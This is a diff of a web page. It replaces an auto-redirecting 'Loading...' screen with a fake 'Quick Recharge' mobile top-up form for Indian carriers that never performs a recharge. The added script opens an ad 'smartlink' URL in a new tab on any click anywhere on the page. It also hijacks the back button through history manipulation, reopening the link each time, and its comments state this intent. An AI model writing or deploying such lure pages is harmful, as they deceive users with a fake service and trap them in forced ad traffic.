@@ -3,99 +3,262 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Quick Recharge</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;700;800&display=swap" rel="stylesheet">
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background:radial-gradient(circle at 50% 40%, #12182b 0%, #070a12 70%);
-    color:#fff;
-    font-family:'Segoe UI',Arial,sans-serif;
-    height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    overflow:hidden;
+  :root{
+    --bg:#0b1f4d;
+    --bg-text:#ffffff;
+    --bg-muted:#aebbdd;
+    --card:#ffffff;
+    --line:#e3e7f0;
+    --text:#0b1f4d;
+    --muted:#6b7280;
+    --accent:#e6231e;
+    --accent-dim:#a4110d;
   }
-  .wrap {
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--bg-text);
+    font-family:'Manrope',sans-serif;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    padding:32px 16px 60px;
+  }
+  .wrap{
+    width:100%;
+    max-width:400px;
+  }
+  .brand{
     text-align:center;
+    margin-bottom:28px;
   }
-  .ring-wrap {
-    position:relative;
-    width:96px;
-    height:96px;
-    margin:0 auto 24px;
+  .brand .mark{
+    font-size:15px;
+    letter-spacing:.5px;
+    color:var(--bg-muted);
+    font-weight:700;
   }
-  .ring {
-    position:absolute;
-    inset:0;
-    border-radius:50%;
-    border:2px solid rgba(255,255,255,0.08);
+  .brand h1{
+    margin:6px 0 0;
+    font-size:26px;
+    font-weight:800;
+    color:var(--bg-text);
   }
-  .ring-progress {
-    position:absolute;
-    inset:0;
-    border-radius:50%;
-    background: conic-gradient(#5eead4 0deg, #818cf8 0deg, transparent 0deg);
-    -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 3px), #000 calc(100% - 3px));
-            mask: radial-gradient(farthest-side, transparent calc(100% - 3px), #000 calc(100% - 3px));
-    animation: sweep 1s linear forwards;
+  .card{
+    background:var(--card);
+    border:1px solid var(--line);
+    border-radius:18px;
+    padding:22px;
+    color:var(--text);
+    box-shadow:0 12px 30px rgba(0,0,0,.25);
   }
-  @keyframes sweep {
-    to { background: conic-gradient(#5eead4 0deg, #818cf8 360deg, transparent 360deg); }
+  label{
+    display:block;
+    font-size:13px;
+    color:var(--muted);
+    margin-bottom:8px;
   }
-  .core {
-    position:absolute;
-    inset:16px;
-    border-radius:50%;
-    background:linear-gradient(135deg,#5eead4,#818cf8);
+  .number-row{
+    display:flex;
+    align-items:center;
+    background:#f4f6fb;
+    border:1px solid var(--line);
+    border-radius:12px;
+    padding:0 14px;
+    margin-bottom:22px;
+  }
+  .number-row span{
+    color:var(--muted);
+    font-size:16px;
+    padding-right:8px;
+    border-right:1px solid var(--line);
+    margin-right:10px;
+  }
+  .number-row input{
+    flex:1;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:var(--text);
+    font-size:18px;
+    font-weight:700;
+    padding:14px 0;
+    letter-spacing:1px;
+  }
+  .number-row input::placeholder{
+    color:#a3aab8;
+    font-weight:500;
+    letter-spacing:normal;
+  }
+  .sims{
+    display:grid;
+    grid-template-columns:repeat(2,1fr);
+    gap:10px;
+    margin-bottom:24px;
+  }
+  .sim{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    background:#f4f6fb;
+    border:1.5px solid var(--line);
+    border-radius:12px;
+    padding:12px;
+    cursor:pointer;
+    transition:border-color .15s ease, background .15s ease;
+  }
+  .sim.active{
+    border-color:var(--accent);
+    background:#fdeceb;
+  }
+  .sim-logo{
+    width:38px;
+    height:38px;
+    border-radius:10px;
     display:flex;
     align-items:center;
     justify-content:center;
-    font-weight:700;
-    font-size:22px;
-    color:#070a12;
-    box-shadow:0 0 24px rgba(94,234,212,0.35), 0 0 48px rgba(129,140,248,0.2);
-    animation: breathe 1s ease-in-out infinite;
-  }
-  @keyframes breathe {
-    0%,100% { transform:scale(1); }
-    50% { transform:scale(1.06); }
-  }
-  .label {
     font-size:13px;
-    color:#6b7280;
-    letter-spacing:0.4px;
+    font-weight:800;
+    font-family:'Manrope',sans-serif;
+    letter-spacing:.2px;
+    color:#fff;
+    flex-shrink:0;
+    box-shadow:inset 0 -2px 4px rgba(0,0,0,.15), 0 2px 5px rgba(0,0,0,.12);
   }
-  .label span {
-    color:#e5e7eb;
-    font-weight:600;
-    font-variant-numeric: tabular-nums;
+  .sim span{
+    font-size:14px;
+    font-weight:700;
+    color:var(--text);
+  }
+  .jio .sim-logo{background:linear-gradient(145deg,#1657c9,#0b2f6b);}
+  .airtel .sim-logo{background:linear-gradient(145deg,#ff2d2d,#b30000);}
+  .vi .sim-logo{background:linear-gradient(145deg,#9b3fc4,#5a1d78);}
+  .bsnl .sim-logo{background:linear-gradient(145deg,#ffa24d,#c2560f);}
+
+  .detected{
+    font-size:12px;
+    color:var(--accent-dim);
+    margin:-14px 0 18px;
+    min-height:14px;
+    font-weight:700;
+  }
+
+  button.continue{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:12px;
+    background:var(--accent);
+    color:#ffffff;
+    font-size:16px;
+    font-weight:800;
+    cursor:pointer;
+  }
+  button.continue:disabled{
+    background:#e5e7eb;
+    color:#9aa0ab;
+    cursor:not-allowed;
+  }
+  .foot{
+    text-align:center;
+    color:var(--bg-muted);
+    font-size:12px;
+    margin-top:18px;
   }
 </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="ring-wrap">
-      <div class="ring"></div>
-      <div class="ring-progress"></div>
-      <div class="core">A</div>
-    </div>
-    <div class="label">Opening in <span id="count">1.0</span>s</div>
+
+<div class="wrap">
+  <div class="brand">
+    <div class="mark">QUICK RECHARGE</div>
+    <h1>Apna number daalein</h1>
   </div>
 
-<script>
-  var target = "https://arisefeistyleery.com/qaakt48zb?key=e909b40d43142400b19ee754974d1ecc";
-  var el = document.getElementById('count');
-  var t = 1.0;
-  var interval = setInterval(function() {
-    t -= 0.1;
-    if (t <= 0) { t = 0; clearInterval(interval); }
-    el.textContent = t.toFixed(1);
-  }, 100);
+  <div class="card">
+    <label for="mobnum">Mobile number</label>
+    <div class="number-row">
+      <span>+91</span>
+      <input id="mobnum" type="tel" inputmode="numeric" maxlength="10" placeholder="98765 43210">
+    </div>
+    <div class="detected" id="detected">&nbsp;</div>
 
-  setTimeout(function() {
-    window.location.replace(target);
-  }, 1000);
+    <label>Operator चुनें</label>
+    <div class="sims" id="sims">
+      <div class="sim jio" data-op="Jio">
+        <div class="sim-logo">Jio</div>
+        <span>Jio</span>
+      </div>
+      <div class="sim airtel" data-op="Airtel">
+        <div class="sim-logo">A</div>
+        <span>Airtel</span>
+      </div>
+      <div class="sim vi" data-op="Vi">
+        <div class="sim-logo">Vi</div>
+        <span>Vi</span>
+      </div>
+      <div class="sim bsnl" data-op="BSNL">
+        <div class="sim-logo">BS</div>
+        <span>BSNL</span>
+      </div>
+    </div>
+
+    <button class="continue" id="continueBtn" disabled>Continue</button>
+  </div>
+
+  <div class="foot">Number check karke sahi operator select karein</div>
+</div>
+
+<script>
+  const input = document.getElementById('mobnum');
+  const sims = document.querySelectorAll('.sim');
+  const btn = document.getElementById('continueBtn');
+  const detected = document.getElementById('detected');
+  let selectedOp = null;
+
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0,10);
+    checkReady();
+    detected.textContent = '\u00A0';
+  });
+
+  sims.forEach(sim => {
+    sim.addEventListener('click', () => {
+      sims.forEach(s => s.classList.remove('active'));
+      sim.classList.add('active');
+      selectedOp = sim.dataset.op;
+      checkReady();
+    });
+  });
+
+  function checkReady(){
+    const valid = input.value.length === 10 && selectedOp;
+    btn.disabled = !valid;
+  }
+
+  btn.addEventListener('click', () => {
+    if (btn.disabled) return;
+    detected.textContent = `Number +91 ${input.value} · ${selectedOp} recharge ke liye ready`;
+  });
+
+  // smartlink - screen par kahin bhi touch/click karne par khulega
+  document.addEventListener('click', () => {
+    window.open('https://arisefeistyleery.com/krqktmkpkj?key=97e1eff02632eefd3fe0ea6ed9a1c38f', '_blank');
+  });
+
+  // back button dabane par bhi smartlink dobara khulega
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', () => {
+    window.open('https://arisefeistyleery.com/krqktmkpkj?key=97e1eff02632eefd3fe0ea6ed9a1c38f', '_blank');
+    history.pushState(null, '', location.href);
+  });
 </script>
+
 </body>
 </html>
